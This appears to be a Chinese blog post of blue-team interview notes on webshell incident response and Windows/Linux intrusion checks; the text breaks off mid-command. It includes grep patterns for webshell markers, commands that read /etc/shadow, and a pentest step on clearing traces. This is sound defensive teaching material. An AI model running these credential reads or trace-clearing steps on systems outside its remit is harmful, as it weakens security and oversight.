<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>蓝队面试 | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hvv中级面试题 用过哪些安全设备 用过比特梵得,卡巴斯基,D盾,宝塔,火绒,360杀毒,金山毒霸,微步云沙箱 渗透测试流程 明确目标：主要是确定需要渗透资产范围；确定规则，如怎么去渗透；确定需求，如客户需要达到一个什么样的效果。 信息收集：信息收集阶段主要是收集一些基础信息，系统信息，应用信息，版"><link rel="shortcut icon" href="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg"><link rel="canonical" href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '蓝队面试',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-15 13:32:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">蓝队面试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-22T15:37:48.000Z" title="发表于 2023-01-22 23:37:48">2023-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-15T05:32:07.518Z" title="更新于 2023-04-15 13:32:07">2023-04-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="蓝队面试"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>hvv中级面试题</h1>
<h2 id="用过哪些安全设备">用过哪些安全设备</h2>
<p>用过比特梵得,卡巴斯基,D盾,宝塔,火绒,360杀毒,金山毒霸,微步云沙箱</p>
<h2 id="渗透测试流程">渗透测试流程</h2>
<p><strong>明确目标：<strong>主要是确定需要</strong>渗透资产范围</strong>；确定规则，如怎么去渗透；确定需求，如客户需要达到一个什么样的效果。</p>
<p><strong>信息收集：<strong>信息收集阶段主要是收集一些基础信息，<strong>系统信息</strong>，<strong>应用信息</strong>，<strong>版本信息</strong>，<strong>服务信息</strong>，<strong>人员信息</strong>以及</strong>相关防护信息</strong>。信息收集大多是工具加手工进行收集信息，工具如 nmap，相关终端命令，浏览器插件，在线工具等。</p>
<p><strong>漏洞探测（挖掘）：<strong>主要是</strong>探测（挖掘）系统漏洞</strong>，<strong>web 服务器漏洞</strong>，<strong>web 应用漏洞</strong>以及<strong>其他端口服务漏洞</strong>，如 telnet，ssh，vnc，远程桌面连接服务（3389）等。</p>
<p>漏洞验证（利用）：漏洞验证主要是利用探测到的漏洞进行攻击，方法主要有自动化验证（msf），手工验证，业务漏洞验证，公开资源的验证等。总的来说就是工具加手工，为了方便，可以将自己渗透常使用的工具进行封装为工具包。</p>
<p>**提升权限：**提升权限主要是在当前用户权限不是管理员的时候需要进行提升权限，提升权限可以是提升系统权限，web 应用权限或是数据库权限等。</p>
<p>**清除痕迹：**清楚痕迹主要是清除渗透过程中操作的一些痕迹，如添加的测试账号，上传的测试文件,  powershell命令的历史记录等。</p>
<p><strong>事后信息分析</strong>：主要是对整个渗透过程进行信息分析与整理，分析脆弱环节，技术防护情况以及管理方面的情况进行一个现状分析以及提出相关建议。</p>
<p><strong>编写渗透测试报告</strong>：根据渗透测试具体情况编写渗透测试报告，渗透测试报告必须简洁明了，说清楚渗透清单（范围），攻击路径，渗透成果，以及详细的漏洞详情（相关描述、漏洞危害等）及可行的修复建议，最后对整改渗透情况进行简单的总结和分析，说清楚目前资产的一个状况是什么样的，应该从哪些方面进行加强和提升。</p>
<h2 id="Webshell应急响应流程">Webshell应急响应流程</h2>
<h3 id="判断是否被植入webshell">判断是否被植入webshell</h3>
<p><code>系统被植入Webshell,可能出现一下几个异常</code>:</p>
<p>网页被篡改，或在网站中发现非管理员设置的内容;</p>
<p>出现攻击者恶意篡改网页或者网页被植入暗链的现象</p>
<p>安全设备报警</p>
<h4 id="临时处理">临时处理</h4>
<p>删除检测到的Webshell文件,对文件进行备份,方便后续取证溯源</p>
<p>对系统进行隔离,防止影响其他系统</p>
<p><code>扫描工具</code>:</p>
<ul>
<li>D盾</li>
</ul>
<p>Webshell 可疑文件隔离 端口进程查看 base64解码 以及克隆用户检测等 文件监控</p>
<ul>
<li>河马Webshell查杀</li>
</ul>
<p>河马Webshell拥有海量的Webshell样本和自主查杀技术,采用传统特征+云端大数据双引擎的查杀技术</p>
<h3 id="webshell查杀">webshell查杀</h3>
<h4 id="Windows系统排查">Windows系统排查</h4>
<p>利用Webshell扫描工具(如D盾)对应用部署目录进行扫描，如网站D: \WWW\目录，或者将当前网站目录文件与此前备份文件进行比对，查看是否存在新增的不一致内容，确定是否包含Webshell相关信息， 并确定Webshel位置及创建时间。然后利用文本文件打开，进一步分析发现可疑内容。</p>
<h4 id="Linux系统排查">Linux系统排查</h4>
<p>在Windows系统中使用的Webshell检测方法在Linux系统中同样适用。在Linux系统中，可用河马Webshell查杀工具扫描，也可手工搜索可能包含Webshell特征的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span><br><span class="line">find ./ type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot; </span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line">find ./ type f -name &quot;*.asp&quot; | xargs grep &quot;execute(&quot; </span><br><span class="line">find ./ type f -name &quot;*.aspx&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line"></span><br><span class="line">//对于免杀Webshell，可以查看是否使用编码</span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot; </span><br></pre></td></tr></table></figure>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="系统排查">系统排查</h3>
<p>攻击者上传Webshell后,往往还会执行进一步的操作,如提权,添加用户,写入系统后门,实现持久化驻留.因此,还需要对系统进行排查,主要排查内容如下</p>
<h4 id="Windows系统排查-2">Windows系统排查</h4>
<h5 id="用户信息排查">用户信息排查</h5>
<p><strong>用户排查:</strong></p>
<p>使用<code>net user</code>命令,可直接查看用户信息(此方法看不到隐藏用户),若发现存在非管理员使用账户,则可能为异常账户</p>
<p>如果需查看某个账户的详细信息,可以使用<code>net user username</code>命令</p>
<p><code>隐藏用户排查</code></p>
<p>打开计算机管理–&gt;本地用户和组.可查询隐藏用户.用户名称以$结尾的为隐藏用户,当然还有一种方法在github是有自动检测的工具</p>
<p><code>克隆用户排查</code></p>
<p>可使用注册表,利用F值进行对比,以排查克隆用户.也可以直接使LP_Check工具排查克隆用户</p>
<h5 id="进程、服务、驱动、启动项排查">进程、服务、驱动、启动项排查</h5>
<p><strong>进程排查:</strong></p>
<p>在排查可疑进程时，可以关注进程名称，对于异常的、不常见的名称要格外注意，另外可以重点观察进程的路径、CPU占用信息等。打开<code>系统信息</code>和<code>任务管理器</code>窗口，均可查看进程名称及其对应的执行文件。</p>
<p>进程信息还可以使用PCHunter工具查看,</p>
<p><strong>黑色条目</strong>代表微软进程</p>
<p><strong>蓝色条目</strong>代表非微软进程,可能是第三方应用程序进程,蓝色缺失文件厂商信息的几次呢需多加关注</p>
<p><strong>红色条目</strong>代表可疑进程,隐藏服务,被挂钩函数</p>
<p><strong>服务排查:</strong></p>
<p>在<code>系统信息窗口--&gt;软件环境--&gt;服务</code>,可查看服务的启动情况及其对应的启动文件</p>
<p>或使用<code>services.msc</code>命令,也可直接查看服务,查找异常服务.</p>
<p><strong>驱动,启动项排查:</strong></p>
<p>命令行<code>msconfig</code>打开启动项;</p>
<h5 id="网络连接排查">网络连接排查</h5>
<p><code>netstat -ano</code> 查看是否有可疑连接</p>
<p>根据<code>netstat -ano</code> 定位出的pid，再通过tasklist命令进行进程定位 <code>tasklist | findstr “PID”</code></p>
<h5 id="任务计划排查">任务计划排查</h5>
<p>攻击者在攻击成功后,添加任务计划往往是为了持久化控制.任务计划日志通常存放在<code>C:\Windows\System32\Tasks</code>目录下,可以直接打开系统自带的<code>任务计划程序</code>窗口进行查看</p>
<p>自定义的任务计划，则较为可疑，需进行排查。</p>
<h5 id="文件排查">文件排查</h5>
<p>攻击者在攻击成功后可能会在本地留下过程文件,这时需要排查各个盘符下的相关敏感目录，以便确定是否存在异常文件。</p>
<p><code>temp相关目录：</code><br>
temp指系统临时文件夹，用于存储系统临时文件。在Windows系统中，常见temp目录主要分<br>
布在如下位置:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\temp</span><br><span class="line">C:\Users\Administrator\AppData\Local\temp</span><br></pre></td></tr></table></figure>
<p>在寻找可疑文件时，先重点查看攻击时间范围内的文件，然后通过文件命令来判断。一般凡是在非系统System32或Syswow64目录下的svchost.exe文件基本为恶意文件；另外，命名特殊的文件也要重点排查。发现可疑文件后，可以提取样本做进一步的鉴定。</p>
<h4 id="linux系统排查">linux系统排查</h4>
<h5 id="账户排查">账户排查</h5>
<p><code>用户信息文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录</span><br></pre></td></tr></table></figure>
<p><code>影子文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV</span><br><span class="line">9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之</span><br><span class="line">后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who			查看当前登陆用户</span><br><span class="line">w			查看系统信息,想知道某一时刻用户的行为</span><br><span class="line">uptime		查看登陆多久,多少用户,负载</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230413191405619.png" alt="image-20230413191405619"></p>
<h5 id="入侵排查">入侵排查</h5>
<p><code>查看特权用户</code><strong>(uid为0)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<p><code>查看可以远程登陆的账户信息</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
<p><code>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>
<p><code>禁用或删除多余以及可以的账户</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usermod -L username 禁用帐号，帐号无法登录/etc/shadow第二栏为!开头</span><br><span class="line">userdel username 删除用户</span><br><span class="line">userdel -r username 将删除该用户,并且将/home下的user目录一并删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="历史命令">历史命令</h4>
<h5 id="通过-bash-history查看帐号执行过的系统命令">通过.bash_history查看帐号执行过的系统命令</h5>
<p>如果想要执行历史命令中的某个命令直接感叹号</p>
<p><code>root的历史命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
<p><code>查看某用户的操作历史</code></p>
<pre><code>cat  /home/username/.bash_history
</code></pre>
<p>在<code>/etc/profile</code>的文件尾部添加如下行数配置信息，可以显示登录的IP地址、执行命令时间等信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br></pre></td></tr></table></figure>
<h4 id="检查异常端口">检查异常端口</h4>
<p>使用netstat网络连接命令,分析可疑端口,IP,PID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看pid所对应的进程文件路径</span><br><span class="line">运行ls -l /proc/PID/exe 或file /proc/PID/exe (PID为对应的pid号)</span><br></pre></td></tr></table></figure>
<h4 id="检查异常进程">检查异常进程</h4>
<p>使用ps命令,分析进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>
<h4 id="检查开机启动项">检查开机启动项</h4>
<p><code>查看启动配置文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/rc*.d/</span><br><span class="line">ls -l /etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>
<p><code>查看运行级别命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure>
<p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链 接即可 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行 级别加载时需要关闭的。</p>
<h4 id="检查定时任务">检查定时任务</h4>
<p>利用crontab创建计划任务</p>
<h5 id="基本命令">基本命令</h5>
<p>crontab -l 列出某个用户cron服务的详细内容</p>
<p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p>
<p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p>
<p>crontab -e 使用编辑器编辑当前的crontab文件</p>
<h5 id="入侵排查-2">入侵排查</h5>
<p>重点关注一下目录中是否存在恶意脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em><em>小技巧： more /etc/cron.daily/</em> 查看目录下所有文件</em>*</p>
<h4 id="检查服务">检查服务</h4>
<h5 id="入侵排查-3">入侵排查</h5>
<p>查询已安装的服务：</p>
<p>RPM包安装的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line">系统在3与5级别下的启动项</span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure>
<p><strong>源码包安装的服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/ 查看是否存在</span><br></pre></td></tr></table></figure>
<h5 id="服务器自启动">服务器自启动</h5>
<p>第一种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level 2345 httpd on 开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure>
<p>第二种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改 /etc/re.d/rc.local 文件</span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure>
<p>第三种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件">检查异常文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</p>
<p>如<code>.test.txt</code>前面带<code>.</code>的文件是隐藏文件</p>
<p>得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
<p>针对可疑文件可以使用stat进行创建修改时间</p>
<h4 id="检查系统日志">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">定位有多少IP在爆破主机的root帐号：</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">| more</span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o 